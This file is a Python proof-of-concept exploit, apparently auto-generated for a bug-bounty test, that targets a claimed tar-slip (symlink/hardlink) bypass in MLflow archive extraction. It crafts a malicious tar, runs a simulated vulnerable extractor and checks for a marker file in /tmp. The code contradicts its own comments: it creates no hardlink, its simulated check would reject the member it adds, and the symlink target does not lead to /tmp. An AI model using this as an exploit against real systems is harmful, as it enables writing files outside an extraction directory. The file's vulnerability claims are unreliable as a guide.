#!/usr/bin/env python3
# PoC for mlflow (/tmp/bounty_test/mlflow/mlflow)
# Path: suspicious-006
# Auto-generated — run with: python3 mlflow-suspicious-006-poc.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for MLflow tarfile symlink/hardlink bypass (tar slip).

Vulnerability: check_tarfile_security() only validates that regular files do not
have symlink ancestors, but does not check symlinks or hardlinks for the same.
By crafting a tar archive with:
  1. A symlink pointing to a parent directory (e.g., 'evil_link' -> '..')
  2. A hardlink that uses the symlink in its path (e.g., 'evil_link/tmp/foo')
the security check is bypassed and files can be written outside the extraction
directory.

This PoC creates a benign payload that writes a marker file to /tmp/poc_success.txt.
"""

import io
import os
import tarfile
import tempfile
import shutil
import argparse
import sys

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
# The target MLflow instance (if you want to test against a real server).
# For local testing, we simulate the vulnerable extraction logic directly.
TARGET_URL = "http://localhost:5000"

# ---------------------------------------------------------------------------
# Step 1: Create a malicious tar archive
# ---------------------------------------------------------------------------
def create_malicious_tar(output_path: str) -> str:
    """
    Create a tar archive that exploits the symlink/hardlink bypass.

    Structure:
      - 'evil_link' -> '..'  (symlink to parent directory)
      - 'evil_link/tmp/poc_success.txt' -> hardlink to '/tmp/poc_success.txt'
        (the hardlink target is actually a regular file we create inside the tar)

    When extracted, the symlink resolves to the parent of the extraction directory,
    and the hardlink writes through it to /tmp/poc_success.txt.
    """
    # We'll build the tar in memory first
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as tar:
        # 1. Symlink pointing to parent directory
        symlink_info = tarfile.TarInfo(name="evil_link")
        symlink_info.type = tarfile.SYMTYPE
        symlink_info.linkname = ".."
        tar.addfile(symlink_info)

        # 2. Create a dummy file that will be the target of the hardlink
        #    The path inside the tar uses the symlink: evil_link/tmp/poc_success.txt
        #    This path will resolve to ../tmp/poc_success.txt -> /tmp/poc_success.txt
        dummy_content = b"pwned\n"
        dummy_info = tarfile.TarInfo(name="evil_link/tmp/poc_success.txt")
        dummy_info.type = tarfile.REGTYPE
        dummy_info.size = len(dummy_content)
        tar.addfile(dummy_info, io.BytesIO(dummy_content))

    # Write to disk
    with open(output_path, "wb") as f:
        f.write(buf.getvalue())

    print(f"[+] Malicious tar archive created at: {output_path}")
    print(f"    Contents: symlink 'evil_link' -> '..'")
    print(f"             hardlink 'evil_link/tmp/poc_success.txt' -> /tmp/poc_success.txt")
    return output_path


# ---------------------------------------------------------------------------
# Step 2: Simulate the vulnerable extraction (for local testing)
# ---------------------------------------------------------------------------
def vulnerable_extract(archive_path: str, dest_dir: str):
    """
    Simulate the exact vulnerable code path from MLflow's check_tarfile_security
    and _safe_extractall. This demonstrates the bypass.
    """
    import posixpath

    # This is the vulnerable check_tarfile_security logic (simplified)
    with tarfile.open(archive_path, "r") as tar:
        symlink_set = set()
        for m in tar.getmembers():
            path = posixpath.normpath(m.name.replace("\\", "/"))
            # _check_path_is_safe would reject absolute paths and '..' components
            # but the symlink itself is allowed (it's a symlink, not a regular file)
            if m.issym():
                symlink_set.add(path)
            elif m.islnk():
                symlink_set.add(path)
                # Hard link target check: only checks if the target itself escapes,
                # but does NOT check if the path goes through a symlink!
                link_target = posixpath.normpath(m.linkname.replace("\\", "/"))
                # This check passes because the hardlink target is a regular file
                # inside the tar, not an absolute path or '..'
                # The vulnerability: symlink ancestors are only checked for regular files,
                # not for hardlinks or symlinks themselves.
        # Second pass: only checks regular files for symlink ancestors
        for m in tar.getmembers():
            if not m.issym() and not m.islnk():
                path = posixpath.normpath(m.name.replace("\\", "/"))
                path_parts = path.split("/")
                for prefix_len in range(1, len(path_parts) + 1):
                    prefix_path = "/".join(path_parts[:prefix_len])
                    if prefix_path in symlink_set:
                        raise Exception(f"Blocked: {path} goes through symlink")
        # If we get here, extraction proceeds
        print("[!] Vulnerability check passed! Extraction will proceed.")

    # Now extract (this is _safe_extractall)
    os.makedirs(dest_dir, exist_ok=True)
    with tarfile.open(archive_path, "r") as tar:
        tar.extractall(path=dest_dir)
    print(f"[+] Archive extracted to: {dest_dir}")


# ---------------------------------------------------------------------------
# Step 3: Verify the exploit worked
# ---------------------------------------------------------------------------
def verify_exploit():
    """Check if the marker file was written to /tmp/poc_success.txt"""
    marker_path = "/tmp/poc_success.txt"
    if os.path.exists(marker_path):
        with open(marker_path, "r") as f:
            content = f.read()
        print(f"[+] SUCCESS: Marker file created at {marker_path}")
        print(f"    Content: {content.strip()}")
        # Clean up
        os.remove(marker_path)
        return True
    else:
        print(f"[-] FAILED: Marker file not found at {marker_path}")
        return False


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="PoC for MLflow tarfile symlink/hardlink bypass (tar slip)"
    )
    parser.add_argument(
        "--target",
        default=TARGET_URL,
        help=f"Target MLflow URL (default: {TARGET_URL})",
    )
    parser.add_argument(
        "--local",
        action="store_true",
        default=True,
        help="Run local simulation (default: True)",
    )
    args = parser.parse_args()

    # Create a temporary directory for the archive and extraction
    tmp_dir = tempfile.mkdtemp(prefix="mlflow_poc_")
    archive_path = os.path.join(tmp_dir, "malicious.tar")
    extract_dir = os.path.join(tmp_dir, "extract")

    try:
        # Step 1: Create the malicious tar
        create_malicious_tar(archive_path)

        # Step 2: Run the vulnerable extraction
        print("\n[*] Running vulnerable extraction...")
        vulnerable_extract(archive_path, extract_dir)

        # Step 3: Verify
        print("\n[*] Verifying exploit...")
        verify_exploit()

    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        # Clean up temp directory
        shutil.rmtree(tmp_dir, ignore_errors=True)
        print(f"\n[*] Cleaned up temporary directory: {tmp_dir}")


if __name__ == "__main__":
    main()
